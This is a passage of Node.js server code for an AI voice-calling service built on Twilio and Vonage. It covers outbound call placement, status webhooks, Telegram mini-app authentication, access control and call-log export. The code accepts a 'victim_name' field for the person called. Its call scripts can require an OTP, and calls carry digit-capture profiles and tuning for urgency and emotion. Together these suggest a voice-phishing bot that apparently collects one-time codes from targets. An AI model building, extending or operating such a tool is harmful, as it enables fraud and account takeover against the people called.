        const response = await vonageAdapter.createOutboundCall({
          to: number,
          callSid: callId,
          answerUrl,
          eventUrl,
        });
        const vonageUuid = response?.uuid;
        providerMetadata = { vonage_uuid: vonageUuid };
        if (vonageUuid) {
          vonageCallMap.set(vonageUuid, callId);
        }
        callStatus = response?.status || "queued";
      } else {
        throw new Error(`Unsupported provider ${provider}`);
      }
      recordProviderSuccess(provider);
      selectedProvider = provider;
      break;
    } catch (error) {
      lastError = error;
      recordProviderError(provider, error);
      console.error(
        `Outbound call failed for provider ${provider}:`,
        error.message || error,
      );
    }
  }

  if (!selectedProvider) {
    throw lastError || new Error("Failed to place outbound call");
  }

  let scriptPolicy = {};
  if (script_id) {
    try {
      const tpl = await db.getCallTemplateById(Number(script_id));
      if (tpl) {
        scriptPolicy = {
          requires_otp: !!tpl.requires_otp,
          default_profile: tpl.default_profile || null,
          expected_length: tpl.expected_length || null,
          allow_terminator: !!tpl.allow_terminator,
          terminator_char: tpl.terminator_char || null,
        };
      }
    } catch (err) {
      console.error("Script metadata load error:", err);
    }
  }

  const createdAt = new Date().toISOString();
  const callConfig = {
    prompt: prompt,
    first_message: first_message,
    created_at: createdAt,
    user_chat_id: user_chat_id,
    customer_name: customer_name || null,
    provider: selectedProvider || currentProvider,
    provider_metadata: providerMetadata,
    business_context: functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: purpose || null,
    business_id: business_id || null,
    script: script || null,
    script_id: script_id || null,
    emotion: emotion || null,
    urgency: urgency || null,
    technical_level: technical_level || null,
    voice_model: voice_model || null,
    collection_profile: collection_profile || null,
    collection_expected_length: collection_expected_length || null,
    collection_timeout_s: collection_timeout_s || null,
    collection_max_retries: collection_max_retries || null,
    collection_mask_for_gpt: collection_mask_for_gpt,
    collection_speak_confirmation: collection_speak_confirmation,
    script_policy: scriptPolicy,
    flow_state: "normal",
    flow_state_updated_at: createdAt,
    call_mode: "normal",
    digit_capture_active: false,
    inbound: false,
  };

  callConfigurations.set(callId, callConfig);
  callFunctionSystems.set(callId, functionSystem);

  try {
    await db.createCall({
      call_sid: callId,
      phone_number: number,
      prompt: prompt,
      first_message: first_message,
      user_chat_id: user_chat_id,
      business_context: JSON.stringify(functionSystem.context),
      generated_functions: JSON.stringify(
        functionSystem.functions.map((f) => f.function.name),
      ),
      direction: "outbound",
    });
    await db.updateCallState(callId, "call_created", {
      customer_name: customer_name || null,
      business_id: business_id || null,
      script: script || null,
      script_id: script_id || null,
      purpose: purpose || null,
      emotion: emotion || null,
      urgency: urgency || null,
      technical_level: technical_level || null,
      voice_model: voice_model || null,
      provider: selectedProvider || currentProvider,
      provider_metadata: providerMetadata,
      from:
        (selectedProvider || currentProvider) === "twilio"
          ? config.twilio?.fromNumber
          : null,
      to: number || null,
      inbound: false,
      collection_profile: collection_profile || null,
      collection_expected_length: collection_expected_length || null,
      collection_timeout_s: collection_timeout_s || null,
      collection_max_retries: collection_max_retries || null,
      collection_mask_for_gpt: collection_mask_for_gpt,
      collection_speak_confirmation: collection_speak_confirmation,
    });

    if (user_chat_id) {
      await db.createEnhancedWebhookNotification(
        callId,
        "call_initiated",
        user_chat_id,
      );
    }

    console.log(`Enhanced adaptive call created: ${callId} to ${number}`);
    console.log(
      `Business context: ${functionSystem.context.industry} - ${functionSystem.context.businessType}`,
    );
  } catch (dbError) {
    console.error("Database error:", dbError);
  }

  return { callId, callStatus, functionSystem };
}

// Enhanced outbound call endpoint with dynamic function generation
app.post("/outbound-call", async (req, res) => {
  try {
    const resolvedCustomerName =
      req.body?.customer_name ?? req.body?.victim_name ?? null;
    const payload = {
      number: req.body?.number,
      prompt: req.body?.prompt,
      first_message: req.body?.first_message,
      user_chat_id: req.body?.user_chat_id,
      customer_name: resolvedCustomerName,
      business_id: req.body?.business_id,
      script: req.body?.script,
      script_id: req.body?.script_id,
      purpose: req.body?.purpose,
      emotion: req.body?.emotion,
      urgency: req.body?.urgency,
      technical_level: req.body?.technical_level,
      voice_model: req.body?.voice_model,
      collection_profile: req.body?.collection_profile,
      collection_expected_length: req.body?.collection_expected_length,
      collection_timeout_s: req.body?.collection_timeout_s,
      collection_max_retries: req.body?.collection_max_retries,
      collection_mask_for_gpt: req.body?.collection_mask_for_gpt,
      collection_speak_confirmation: req.body?.collection_speak_confirmation,
    };

    const host = resolveHost(req) || config.server?.hostname;
    const result = await placeOutboundCall(payload, host);

    res.json({
      success: true,
      call_sid: result.callId,
      to: payload.number,
      status: result.callStatus,
      provider: currentProvider,
      business_context: result.functionSystem.context,
      generated_functions: result.functionSystem.functions.length,
      function_types: result.functionSystem.functions.map(
        (f) => f.function.name,
      ),
      enhanced_webhooks: true,
    });
  } catch (error) {
    console.error("Error creating enhanced adaptive outbound call:", error);
    res.status(500).json({
      error: "Failed to create outbound call",
      details: error.message,
    });
  }
});

async function processCallStatusWebhookPayload(payload = {}, options = {}) {
  const {
    CallSid,
    CallStatus,
    Duration,
    From,
    To,
    CallDuration,
    AnsweredBy,
    ErrorCode,
    ErrorMessage,
    DialCallDuration,
  } = payload || {};

  if (!CallSid) {
    const err = new Error("Missing CallSid");
    err.code = "missing_call_sid";
    throw err;
  }

  const source = options.source || "provider";
  if (!shouldProcessCallStatusPayload(payload, options)) {
    console.log(`⏭️ Duplicate status webhook ignored for ${CallSid}`);
    return { ok: true, callSid: CallSid, deduped: true };
  }

  console.log(`Fixed Webhook: Call ${CallSid} status: ${CallStatus}`.blue);
  console.log(`Debug Info:`);
  console.log(`Duration: ${Duration || "N/A"}`);
  console.log(`CallDuration: ${CallDuration || "N/A"}`);
  console.log(`DialCallDuration: ${DialCallDuration || "N/A"}`);
  console.log(`AnsweredBy: ${AnsweredBy || "N/A"}`);

  const durationCandidates = [Duration, CallDuration, DialCallDuration]
    .map((value) => parseInt(value, 10))
    .filter((value) => Number.isFinite(value));
  const durationValue = durationCandidates.length
    ? Math.max(...durationCandidates)
    : 0;

  let call = await db.getCall(CallSid);
  if (!call) {
    console.warn(`Webhook received for unknown call: ${CallSid}`);
    call = await ensureCallRecord(CallSid, payload, "status_webhook");
    if (!call) {
      return { ok: false, error: "call_not_found", callSid: CallSid };
    }
  }

  const streamMediaState = await db
    .getLatestCallState(CallSid, "stream_media")
    .catch(() => null);
  const hasStreamMedia = Boolean(
    streamMediaState?.at || streamMediaState?.timestamp,
  );
  let notificationType = null;
  const rawStatus = String(CallStatus || "").toLowerCase();
  const answeredByValue = String(AnsweredBy || "").toLowerCase();
  const isMachineAnswered = [
    "machine_start",
    "machine_end",
    "machine",
    "fax",
  ].includes(answeredByValue);
  const voicemailDetected = isMachineAnswered;
  let actualStatus = rawStatus || "unknown";
  const priorStatus = String(call.status || "").toLowerCase();
  const hasAnswerEvidence =
    !!call.started_at ||
    ["answered", "in-progress", "completed"].includes(priorStatus) ||
    durationValue > 0 ||
    !!AnsweredBy ||
    hasStreamMedia;

  if (voicemailDetected) {
    console.log(
      `AMD detected voicemail (${answeredByValue}) - classifying as no-answer`
        .yellow,
    );
    actualStatus = "no-answer";
    notificationType = "call_no_answer";
  } else if (actualStatus === "completed") {
    console.log(`Analyzing completed call: Duration = ${durationValue}s`);

    if ((durationValue === 0 || durationValue < 6) && !hasAnswerEvidence) {
      console.log(
        `Short duration detected (${durationValue}s) - treating as no-answer`
          .red,
      );
      actualStatus = "no-answer";
      notificationType = "call_no_answer";
    } else if (voicemailDetected && durationValue < 10 && !hasAnswerEvidence) {
      console.log(
        `Voicemail detected with short duration - classifying as no-answer`.red,
      );
      actualStatus = "no-answer";
      notificationType = "call_no_answer";
    } else {
      console.log(
        `Valid call duration (${durationValue}s) - confirmed answered`,
      );
      actualStatus = "completed";
      notificationType = "call_completed";
    }
  } else {
    switch (actualStatus) {
      case "queued":
      case "initiated":
        notificationType = "call_initiated";
        break;
      case "ringing":
        notificationType = "call_ringing";
        break;
      case "in-progress":
        notificationType = "call_in_progress";
        break;
      case "answered":
        notificationType = "call_answered";
        break;
      case "busy":
        notificationType = "call_busy";
        break;
      case "no-answer":
        notificationType = "call_no_answer";
        break;
      case "voicemail":
        actualStatus = "no-answer";
        notificationType = "call_no_answer";
        break;
      case "failed":
        notificationType = "call_failed";
        break;
      case "canceled":
        notificationType = "call_canceled";
        break;
      default:
        console.warn(`Unknown call status: ${CallStatus}`);
        notificationType = `call_${actualStatus}`;
    }
  }

  if (actualStatus === "no-answer" && hasAnswerEvidence && !voicemailDetected) {
    actualStatus = "completed";
    notificationType = "call_completed";
  }

  console.log(
    `Final determination: ${CallStatus} → ${actualStatus} → ${notificationType}`,
  );

  const updateData = {
    duration: durationValue,
    twilio_status: CallStatus,
    answered_by: AnsweredBy,
    error_code: ErrorCode,
    error_message: ErrorMessage,
  };

  const applyStatus = shouldApplyStatusUpdate(priorStatus, actualStatus, {
    allowTerminalUpgrade: actualStatus === "completed",
  });
  const finalStatus = applyStatus
    ? actualStatus
    : normalizeCallStatus(priorStatus || actualStatus);
  const finalNotificationType = applyStatus ? notificationType : null;

  if (applyStatus && actualStatus === "ringing") {
    try {
      await db.updateCallState(CallSid, "ringing", {
        at: new Date().toISOString(),
      });
    } catch (stateError) {
      console.error("Failed to record ringing state:", stateError);
    }
  }

  if (applyStatus && actualStatus === "no-answer" && call.created_at) {
    let ringStart = null;
    try {
      const ringState = await db.getLatestCallState(CallSid, "ringing");
      ringStart = ringState?.at || ringState?.timestamp || null;
    } catch (stateError) {
      console.error("Failed to load ringing state:", stateError);
    }

    const now = new Date();
    const callStart = new Date(call.created_at);
    const ringStartTime = ringStart ? new Date(ringStart) : callStart;
    const ringDuration = Math.round((now - ringStartTime) / 1000);
    updateData.ring_duration = ringDuration;
    if (!updateData.duration || updateData.duration < ringDuration) {
      updateData.duration = ringDuration;
    }
    console.log(`Calculated ring duration: ${ringDuration}s`);
  }

  if (
    applyStatus &&
    ["in-progress", "answered"].includes(actualStatus) &&
    !call.started_at
  ) {
    updateData.started_at = new Date().toISOString();
  } else if (applyStatus && !call.ended_at) {
    const isTerminal = [
      "completed",
      "no-answer",
      "failed",
      "busy",
      "canceled",
    ].includes(actualStatus);
    const rawTerminal = [
      "completed",
      "no-answer",
      "failed",
      "busy",
      "canceled",
    ].includes(rawStatus);
    if (isTerminal && rawTerminal) {
      updateData.ended_at = new Date().toISOString();
    }
  }

  await db.updateCallStatus(CallSid, finalStatus, updateData);
  if (applyStatus) {
    recordCallLifecycle(CallSid, finalStatus, {
      source,
      raw_status: CallStatus,
      answered_by: AnsweredBy,
      duration: updateData.duration,
    });
    if (isTerminalStatusKey(finalStatus)) {
      scheduleCallLifecycleCleanup(CallSid);
    }
  }

  if (
    call.user_chat_id &&
    finalNotificationType &&
    !options.skipNotifications
  ) {
    try {
      await db.createEnhancedWebhookNotification(
        CallSid,
        finalNotificationType,
        call.user_chat_id,
      );
      console.log(
        `📨 Created corrected ${finalNotificationType} notification for call ${CallSid}`,
      );

      if (actualStatus !== CallStatus.toLowerCase()) {
        await db.logServiceHealth("webhook_system", "status_corrected", {
          call_sid: CallSid,
          original_status: CallStatus,
          corrected_status: actualStatus,
          duration: updateData.duration,
          reason: "Short duration analysis",
          source,
        });
      }
    } catch (notificationError) {
      console.error(
        "Error creating enhanced webhook notification:",
        notificationError,
      );
    }
  }

  console.log(
    `Fixed webhook processed: ${CallSid} -> ${CallStatus} (corrected to: ${actualStatus})`,
  );
  if (updateData.duration) {
    const minutes = Math.floor(updateData.duration / 60);
    const seconds = updateData.duration % 60;
    console.log(
      `Call metrics: ${minutes}:${String(seconds).padStart(2, "0")} duration`,
    );
  }

  await db.logServiceHealth("webhook_system", "status_received", {
    call_sid: CallSid,
    original_status: CallStatus,
    final_status: actualStatus,
    duration: updateData.duration,
    answered_by: AnsweredBy,
    correction_applied: actualStatus !== CallStatus.toLowerCase(),
    source,
  });

  return {
    ok: true,
    callSid: CallSid,
    rawStatus,
    actualStatus,
    notificationType,
    duration: updateData.duration,
    voicemailDetected,
  };
}

// Enhanced webhook endpoint for call status updates
app.post("/webhook/call-status", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/call-status")) {
      return;
    }
    await processCallStatusWebhookPayload(req.body, { source: "provider" });
  } catch (error) {
    console.error("Error processing fixed call status webhook:", error);

    // Log error to service health
    try {
      await db.logServiceHealth("webhook_system", "error", {
        operation: "process_webhook",
        error: error.message,
        call_sid: req.body?.CallSid,
      });
    } catch (logError) {
      console.error("Failed to log webhook error:", logError);
    }
  }
  res.status(200).send("OK");
});

// Twilio Media Stream status callback
app.post("/webhook/twilio-stream", (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/twilio-stream")) {
      return;
    }
    const payload = req.body || {};
    const callSid = payload.CallSid || payload.callSid || "unknown";
    const streamSid = payload.StreamSid || payload.streamSid || "unknown";
    const eventType =
      payload.EventType || payload.eventType || payload.event || "unknown";
    const dedupeKey = `${callSid}:${streamSid}:${eventType}`;
    const now = Date.now();
    const lastSeen = streamStatusDedupe.get(dedupeKey);
    if (!lastSeen || now - lastSeen > 2000) {
      streamStatusDedupe.set(dedupeKey, now);
      console.log("Twilio stream status", {
        callSid,
        streamSid,
        eventType,
        status: payload.StreamStatus || payload.streamStatus || null,
      });
    }

    if (eventType === "start") {
      if (callSid !== "unknown" && streamSid !== "unknown") {
        const existing = activeStreamConnections.get(callSid);
        if (!existing) {
          activeStreamConnections.set(callSid, {
            ws: null,
            streamSid,
            connectedAt: new Date().toISOString(),
          });
        }
        db.updateCallState(callSid, "stream_status_start", {
          stream_sid: streamSid,
          at: new Date().toISOString(),
        }).catch(() => {});
      }
    } else if (eventType === "end") {
      if (callSid !== "unknown") {
        db.updateCallState(callSid, "stream_status_end", {
          stream_sid: streamSid,
          at: new Date().toISOString(),
        }).catch(() => {});
      }
    }
  } catch (err) {
    console.error("Twilio stream status webhook error:", err);
  }
  res.status(200).send("OK");
});

function getMiniappLiveSnapshot() {
  if (!webhookService?.listLiveConsoles) return [];
  return webhookService.listLiveConsoles();
}

function escapeCsvValue(value) {
  if (value === null || value === undefined) return "";
  const str = String(value);
  if (/[",\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

function callsToCsv(calls = []) {
  const headers = [
    "call_sid",
    "status",
    "direction",
    "phone_number",
    "created_at",
    "duration",
    "answered_by",
    "error_code",
    "error_message",
  ];
  const lines = [headers.join(",")];
  for (const call of calls) {
    const row = headers.map((key) => escapeCsvValue(call?.[key]));
    lines.push(row.join(","));
  }
  return lines.join("\n");
}

function normalizeDateFilter(value, isEnd = false) {
  if (!value) return null;
  const raw = String(value).trim();
  if (!raw) return null;
  if (/^\d{4}-\d{2}-\d{2}$/.test(raw)) {
    return `${raw} ${isEnd ? "23:59:59" : "00:00:00"}`;
  }
  return raw;
}

async function handleInboundAdminDecision(callSid, action, adminId) {
  if (!callSid) {
    return { ok: false, error: "missing_call_sid" };
  }
  const callRecord = await db.getCall(callSid).catch(() => null);
  if (!callRecord) {
    return { ok: false, error: "call_not_found" };
  }
  const gate = webhookService.getInboundGate(callSid);
  if (
    gate?.status === "answered" ||
    gate?.status === "declined" ||
    gate?.status === "expired"
  ) {
    return { ok: false, error: "already_handled", status: gate?.status };
  }
  if (action === "answer") {
    webhookService.setInboundGate(callSid, "answered", { chatId: adminId });
    webhookService.setConsoleCompact(callSid, false);
    webhookService.addLiveEvent(callSid, "✅ Admin answered", { force: true });
    await db
      .updateCallState(callSid, "admin_answered", {
        at: new Date().toISOString(),
        by: adminId,
      })
      .catch(() => {});
    await connectInboundCall(callSid);
    await db
      .logMiniappAudit({
        user_id: String(adminId || ""),
        action: "inbound.answer",
        call_sid: callSid,
      })
      .catch(() => {});
    return { ok: true, status: "answered" };
  }
  if (action === "decline") {
    webhookService.setInboundGate(callSid, "declined", { chatId: adminId });
    webhookService.addLiveEvent(callSid, "❌ Declined by admin", {
      force: true,
    });
    await db
      .updateCallState(callSid, "admin_declined", {
        at: new Date().toISOString(),
        by: adminId,
      })
      .catch(() => {});
    await endCallForProvider(callSid);
    await webhookService.setLiveCallPhase(callSid, "ended").catch(() => {});
    await db
      .logMiniappAudit({
        user_id: String(adminId || ""),
        action: "inbound.decline",
        call_sid: callSid,
      })
      .catch(() => {});
    return { ok: true, status: "declined" };
  }
  return { ok: false, error: "invalid_action" };
}

function truncatePrompt(value, limit = 800) {
  const text = String(value || "").trim();
  if (!text) return "";
  if (text.length <= limit) return text;
  return `${text.slice(0, limit)}...`;
}

async function applyScriptInjection(callSid, scriptId, userId) {
  if (!callSid || !scriptId) return { ok: false, error: "missing_script" };
  if (!db) return { ok: false, error: "db_unavailable" };
  const script = await db.getCallTemplateById(scriptId);
  if (!script) return { ok: false, error: "script_not_found" };
  const callConfig = callConfigurations.get(callSid);
  if (!callConfig) return { ok: false, error: "call_not_active" };
  callConfig.script = script.name || callConfig.script;
  callConfig.script_id = script.id || callConfig.script_id;
  if (script.prompt) {
    callConfig.prompt = script.prompt;
  }
  if (script.first_message) {
    callConfig.first_message = script.first_message;
  }
  callConfigurations.set(callSid, callConfig);

  const session = activeCalls.get(callSid);
  if (session?.gptService) {
    const promptPreview = truncatePrompt(script.prompt || "");
    const intentLine = `Injected script: ${script.name || "custom"}. ${promptPreview}`;
    session.gptService.setCallIntent(intentLine);
  }

  await db
    .updateCallState(callSid, "script_injected", {
      script_id: script.id,
      script_name: script.name || null,
      user_id: userId || null,
      at: new Date().toISOString(),
    })
    .catch(() => {});

  emitMiniappEvent("call.updated", callSid, {
    script_id: script.id,
    script_name: script.name || null,
    source: "script_injected",
  });

  await db
    .logMiniappAudit({
      user_id: String(userId || ""),
      action: "webapp.script.inject",
      call_sid: callSid,
      metadata: { script_id: script.id },
    })
    .catch(() => {});

  return { ok: true, script };
}

// Mini App endpoints (Telegram initData auth)
app.post("/miniapp/bootstrap", async (req, res) => {
  try {
    const user = req.miniappInitUser;
    if (!user?.id) {
      return res.status(401).json({ ok: false, error: "missing_user" });
    }
    if (!(await isMiniappUserAllowed(user.id))) {
      return res.status(403).json({ ok: false, error: "not_authorized" });
    }
    const session = await createMiniappSession(user, req);
    await db
      .logMiniappAudit({
        user_id: String(user.id),
        action: "miniapp.login",
        metadata: { username: user.username || null },
        ip: req.ip,
        user_agent: req.headers["user-agent"],
      })
      .catch(() => {});
    return res.json({
      ok: true,
      session_token: session.token,
      refresh_token: session.refresh_token,
      session_expires_at: session.expires_at,
      refresh_expires_at: session.refresh_expires_at,
      user: {
        id: user.id,
        username: user.username || null,
        first_name: user.first_name || null,
        last_name: user.last_name || null,
      },
      roles: session.roles,
      branding: {
        name: config.miniapp?.brandName || "VOICEDNUT",
      },
      theme: config.miniapp?.theme || null,
      features: {
        live_console: true,
        calllog: true,
      },
    });
  } catch (error) {
    console.error("Miniapp bootstrap error:", error);
    return res.status(500).json({ ok: false, error: "bootstrap_failed" });
  }
});

app.post("/miniapp/refresh", async (req, res) => {
  try {
    if (!db) {
      await ensureTestDbReady();
    }
    if (!db) {
      return res.status(500).json({ ok: false, error: "db_unavailable" });
    }
    const refreshToken = resolveMiniappRefreshToken(req);
    if (!refreshToken) {
      return res.status(401).json({ ok: false, error: "missing_refresh" });
    }
    const session = await db.getMiniappSessionByRefresh(refreshToken);
    if (!session) {
      return res.status(401).json({ ok: false, error: "invalid_refresh" });
    }
    const refreshExpiresAt = session.refresh_expires_at
      ? Date.parse(session.refresh_expires_at)
      : null;
    if (refreshExpiresAt && Date.now() > refreshExpiresAt) {
      await db.revokeMiniappSession(session.session_token).catch(() => {});
      return res.status(401).json({ ok: false, error: "refresh_expired" });
    }
    if (!(await isMiniappUserAllowed(session.user_id))) {
      await db.revokeMiniappSession(session.session_token).catch(() => {});
      return res.status(403).json({ ok: false, error: "not_authorized" });
    }
    const newSessionToken = crypto.randomBytes(24).toString("hex");
    const newRefreshToken = crypto.randomBytes(32).toString("hex");
    const now = Date.now();
    const expiresAt = new Date(now + MINIAPP_SESSION_TTL_MS).toISOString();
    const refreshExpiresAtNew = new Date(
      now + MINIAPP_REFRESH_TTL_MS,
    ).toISOString();
    await db.rotateMiniappSession(refreshToken, {
      session_token: newSessionToken,
      refresh_token: newRefreshToken,
      expires_at: expiresAt,
      refresh_expires_at: refreshExpiresAtNew,
      ip: req.ip,
      user_agent: req.headers["user-agent"],
    });
    await db
      .logMiniappAudit({
        user_id: String(session.user_id),
        action: "miniapp.refresh",
        metadata: { rotated: true },
        ip: req.ip,
        user_agent: req.headers["user-agent"],
      })
      .catch(() => {});
    return res.json({
      ok: true,
      session_token: newSessionToken,
      refresh_token: newRefreshToken,
      session_expires_at: expiresAt,
      refresh_expires_at: refreshExpiresAtNew,
      roles: session.roles || [],
    });
  } catch (error) {
    console.error("Miniapp refresh error:", error);
    return res.status(500).json({ ok: false, error: "refresh_failed" });
  }
});

app.get(
  "/miniapp/access",
  requireMiniappAccessAdmin,
  async (req, res) => {
    try {
      const access = await getMiniappAccessLists();
      return res.json({
        ok: true,
        admins: access.admins,
        operators: access.operators,
        viewers: access.viewers,
        env_admins: access.envAdmins,
        env_operators: access.envOperators,
        env_viewers: access.envViewers,
        custom_admins: access.customAdmins,
        custom_operators: access.customOperators,
        custom_viewers: access.customViewers,
      });
    } catch (error) {
      console.error("Miniapp access read error:", error);
      return res.status(500).json({ ok: false, error: "access_read_failed" });
    }
  },
);

app.post(
  "/miniapp/access",
  requireMiniappAccessAdmin,
  async (req, res) => {
    try {
      const adminsInput =
        req.body?.admins ?? req.body?.admin_ids ?? req.body?.adminIds ?? "";
      const operatorsInput =
        req.body?.operators ??
        req.body?.operator_ids ??
        req.body?.operatorIds ??
        "";
      const viewersInput =
        req.body?.viewers ?? req.body?.viewer_ids ?? req.body?.viewerIds ?? "";
      const admins = parseAccessList(adminsInput);
      const operators = parseAccessList(operatorsInput);
      const viewers = parseAccessList(viewersInput);
      const access = await getMiniappAccessLists();
      const currentAdmin = String(req.miniappSession?.user?.id || "");
      if (
        currentAdmin &&
        !access.envAdmins.includes(currentAdmin) &&
        !admins.includes(currentAdmin)
      ) {
        admins.push(currentAdmin);
      }
      await db.setSetting(MINIAPP_ACCESS_ADMIN_KEY, JSON.stringify(admins));
      await db.setSetting(
        MINIAPP_ACCESS_OPERATOR_KEY,
        JSON.stringify(operators),
      );
      await db.setSetting(MINIAPP_ACCESS_VIEWER_KEY, JSON.stringify(viewers));
      await loadMiniappAccessCache(true);
      const updated = await getMiniappAccessLists();
      await db
        .logMiniappAudit({
          user_id: currentAdmin,
          action: "miniapp.access.update",
          metadata: {
            admins_count: updated.admins.length,
            operators_count: updated.operators.length,
            viewers_count: updated.viewers.length,
          },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
      return res.json({
        ok: true,
        admins: updated.admins,
        operators: updated.operators,
        viewers: updated.viewers,
        env_admins: updated.envAdmins,
        env_operators: updated.envOperators,
        env_viewers: updated.envViewers,
        custom_admins: updated.customAdmins,
        custom_operators: updated.customOperators,
        custom_viewers: updated.customViewers,
      });
    } catch (error) {
      console.error("Miniapp access update error:", error);
      return res.status(500).json({ ok: false, error: "access_update_failed" });
    }
  },
);

app.get("/miniapp/stream", requireMiniappSession, (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders?.();

  const token = resolveMiniappToken(req);
  const userId = req.miniappSession?.user?.id || null;
  const client = { res, token, userId };
  miniappClients.add(client);

  const since = Number(req.query?.since || 0);
  if (Number.isFinite(since) && since > 0) {
    const pending = miniappEventBuffer.filter((evt) => evt.sequence > since);
    for (const evt of pending) {
      res.write(`data: ${JSON.stringify(evt)}\n\n`);
    }
  }

  const heartbeat = setInterval(() => {
    try {
      res.write(`event: heartbeat\n`);
      res.write(
        `data: ${JSON.stringify({ ts: new Date().toISOString() })}\n\n`,
      );
    } catch (_) {}
  }, 20000);

  req.on("close", () => {
    clearInterval(heartbeat);
    miniappClients.delete(client);
  });
});

app.get("/miniapp/resync", requireMiniappSession, (req, res) => {
  const after = Number(req.query?.after || 0);
  const limit = Math.min(200, Math.max(1, Number(req.query?.limit || 100)));
  const events = miniappEventBuffer
    .filter((evt) => evt.sequence > after)
    .slice(-limit);
  const liveCalls = getMiniappLiveSnapshot();
  res.json({
    ok: true,
    events,
    live_calls: liveCalls,
    latest_sequence: miniappSequence,
  });
});

app.get("/miniapp/calls/active", requireMiniappSession, (req, res) => {
  res.json({
    ok: true,
    calls: getMiniappLiveSnapshot(),
    latest_sequence: miniappSequence,
  });
});

app.get("/miniapp/calls/recent", requireMiniappSession, async (req, res) => {
  try {
    const limit = Math.min(50, Math.max(1, Number(req.query?.limit || 10)));
    const offset = Math.max(0, Number(req.query?.offset || 0));
    const status = req.query?.status || null;
    const direction = req.query?.direction || null;
    const query = req.query?.q || req.query?.query || null;
    const start = normalizeDateFilter(req.query?.start || null, false);
    const end = normalizeDateFilter(req.query?.end || null, true);
    const calls = await db.getRecentCalls({
      limit,
      offset,
      status,
      direction,
      query,
      start,
      end,
    });
    res.json({
      ok: true,
      calls: calls.map(normalizeCallRecordForApi),
    });
  } catch (error) {
    console.error("Miniapp recent calls error:", error);
    res.status(500).json({ ok: false, error: "failed_to_fetch_calls" });
  }
});

app.get(
  "/miniapp/calls/export",
  requireMiniappSession,
  requireMiniappAdmin,
  async (req, res) => {
    try {
      const limit = Math.min(
        5000,
        Math.max(1, Number(req.query?.limit || 1000)),
      );
      const offset = Math.max(0, Number(req.query?.offset || 0));
      const status = req.query?.status || null;
      const direction = req.query?.direction || null;
      const query = req.query?.q || req.query?.query || null;
      const start = normalizeDateFilter(req.query?.start || null, false);
      const end = normalizeDateFilter(req.query?.end || null, true);
      const calls = await db.getRecentCalls({
        limit,
        offset,
        status,
        direction,
        query,
        start,
        end,
      });
      const csv = callsToCsv(calls.map(normalizeCallRecordForApi));
      res.setHeader("Content-Type", "text/csv");
      res.setHeader(
        "Content-Disposition",
        'attachment; filename=\"voxly_calls.csv\"',
      );
      res.send(csv);
      await db
        .logMiniappAudit({
          user_id: String(req.miniappSession?.user?.id || ""),
          action: "miniapp.export",
          metadata: { limit, offset, status, direction, query, start, end },
          ip: req.ip,
          user_agent: req.headers["user-agent"],
        })
        .catch(() => {});
    } catch (error) {
      console.error("Miniapp export error:", error);
      res.status(500).json({ ok: false, error: "export_failed" });
    }
  },
);

app.get("/miniapp/calls/:callSid", requireMiniappSession, async (req, res) => {
  try {
    const call = await db.getCall(req.params.callSid);
    if (!call) {
      return res.status(404).json({ ok: false, error: "call_not_found" });
    }
    res.json({ ok: true, call: normalizeCallRecordForApi(call) });
  } catch (error) {
    console.error("Miniapp call detail error:", error);
    res.status(500).json({ ok: false, error: "failed_to_fetch_call" });
  }
});

app.get(
  "/miniapp/calls/:callSid/status",
  requireMiniappSession,
  async (req, res) => {
    try {
      const { callSid } = req.params;
      const call = await db.getCall(callSid);
      if (!call) {
        return res.status(404).json({ ok: false, error: "call_not_found" });
      }
      const recentStates = await db.getCallStates(callSid, { limit: 20 });
      res.json({
        ok: true,
        call: normalizeCallRecordForApi(call),
        recent_states: recentStates,
      });
    } catch (error) {
      console.error("Miniapp call status error:", error);
      res.status(500).json({ ok: false, error: "failed_to_fetch_status" });
    }
  },
);

app.post(
  "/miniapp/calls/:callSid/answer",
  requireMiniappSession,
  requireMiniappAdmin,
  async (req, res) => {
    try {
      const { callSid } = req.params;
      const result = await handleInboundAdminDecision(
        callSid,
        "answer",
        req.miniappSession?.user?.id,
      );
      if (!result.ok) {
        return res.status(result.error === "already_handled" ? 409 : 400).json({
          ok: false,
          error: result.error,
          status: result.status || null,
        });
      }
      return res.json({ ok: true, status: result.status });
    } catch (error) {
      console.error("Miniapp answer error:", error);
      return res.status(500).json({ ok: false, error: "answer_failed" });
    }
  },
);

app.post(
  "/miniapp/calls/:callSid/decline",
  requireMiniappSession,
  requireMiniappAdmin,
  async (req, res) => {
    try {
      const { callSid } = req.params;
      const result = await handleInboundAdminDecision(
        callSid,
        "decline",
        req.miniappSession?.user?.id,
      );
      if (!result.ok) {
        return res.status(result.error === "already_handled" ? 409 : 400).json({
          ok: false,
          error: result.error,
          status: result.status || null,
        });
      }
      return res.json({ ok: true, status: result.status });
    } catch (error) {
      console.error("Miniapp decline error:", error);
      return res.status(500).json({ ok: false, error: "decline_failed" });
    }
  },
);

// WebApp endpoints (Telegram initData -> short-lived JWT)
app.post(
  "/webapp/auth",
  webappAuthLimiter,
  requireWebappTmaAuth,
  async (req, res) => {
    try {
      const user = req.miniappInitUser;
      if (!user?.id) {
        logWebappAuthEvent(req, "webapp.auth.failed", {
          reason: "missing_user",
        });
        return res.status(401).json({
          ok: false,
          error: "missing_user",
          message: webappErrorMessage("missing_user"),
        });
      }
      const roles = await resolveMiniappRoles(user.id);
      if (!roles.length) {
        logWebappAuthEvent(
          req,
          "webapp.auth.failed",
          { reason: "not_authorized" },
          user.id,
        );
        return res.status(403).json({
          ok: false,
          error: "not_authorized",
          message: webappErrorMessage("not_authorized"),
        });
      }
      const now = Math.floor(Date.now() / 1000);
      const tokenId = createWebappTokenId();
      const payload = {
        sub: String(user.id),
        username: user.username || null,
        first_name: user.first_name || null,
        last_name: user.last_name || null,
        roles,
        tenant_id: WEBAPP_TENANT_ID,
        aud: WEBAPP_JWT_AUDIENCE,
        jti: tokenId,
        iat: now,
        exp: now + WEBAPP_JWT_TTL_S,
        iss: WEBAPP_JWT_ISSUER,
      };
      const token = signWebappJwt(payload);
      if (!token) {
        logWebappAuthEvent(
          req,
          "webapp.auth.failed",
          { reason: "token_unavailable" },
          user.id,
        );
        return res.status(500).json({
          ok: false,
          error: "token_unavailable",
          message: "Auth token unavailable. Check server configuration.",
